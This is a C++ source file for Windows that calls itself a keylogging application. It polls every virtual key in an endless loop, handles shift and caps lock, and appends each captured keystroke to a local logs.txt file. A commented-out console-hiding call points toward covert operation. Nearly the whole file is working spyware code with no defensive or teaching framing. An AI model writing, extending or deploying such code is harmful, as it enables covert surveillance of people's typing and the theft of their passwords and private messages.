// Keylogging application written in C++
// Written by haeoro.

#include "mappings.h"
#include "constants.h"
#include "find_shift_keys.h"

#include <windows.h>
#include <iostream>
#include <fstream>

void writeKeyStroke(int trueKey)
{
    std::ofstream file;
    file.open("logs.txt", std::ios::app);
        
    if (trueKey == BACKSPACE)
        
    {
        file << "BACKSPACE";
    }
    else if (trueKey == ENTER)
    {
        file << "\n";
    }
    else
    {
        file << static_cast<char>(trueKey);
    }
    file.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    //FreeConsole();
    Maps vkMaps;
    vkMaps.initializeMaps();
    while (1)
    {
        for (int i = 1; i < 254; i++)
        {
            int key = GetAsyncKeyState(i);
            while (key == KEY_IS_PRESSED && i != 16)
            {
                std::cout << i << '\n';
                int specialKey = vkMaps.searchAsciiMaps(i);
                if (isShiftPressed() == 1) 
                {
                    writeKeyStroke(findShiftPlusKey());
                    key = 0;
                }
                else if (vkMaps.searchAsciiMaps(i) != 1) 
                {
                    writeKeyStroke(specialKey);
                    key = 0;
                    break;
                }
                else 
                {
                    int getCapOrLowKey = isCapslockOn(i);
                    writeKeyStroke(getCapOrLowKey);
                    key = 0;
                }
            }
        }
    }
}

/*
            Notes
        ~ ensure that checks are made to check if VK_CAPITAL is being pressed and convert accordingly. (with regards to alphabetical characters)


            To-do
        ~ develop naming convention for characters that don't translate to ascii values. 
        {kp=BACKSPACE}

*/ 
